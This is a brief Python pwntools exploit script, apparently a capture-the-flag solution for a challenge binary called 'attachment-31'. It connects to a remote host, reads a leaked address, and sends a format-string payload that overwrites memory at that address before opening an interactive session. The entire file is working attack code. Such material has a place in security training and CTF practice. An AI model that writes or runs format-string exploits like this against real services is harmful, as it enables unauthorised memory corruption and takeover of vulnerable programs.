#!/usr/bin/env python2
from pwn import *
from LibcSearcher import *
from struct import pack
import os, base64, math, time
context(arch = "i386",os = "linux", log_level = "debug")


p = remote("123.57.69.203", 5310)
# p = process('./attachment-31')
elf = ELF('./attachment-31')

# gdb_command = ""
# gdb.attach(p, gdb_command)
# time.sleep(2)


x_addr = int(p.recv(10), 16)
log.info(hex(x_addr))

for _ in range(3):
    p.sendline("1")
p.recvuntil("What's your name?\n")
payload = fmtstr_payload(10, {x_addr: 9})
p.sendline(payload)

p.interactive()
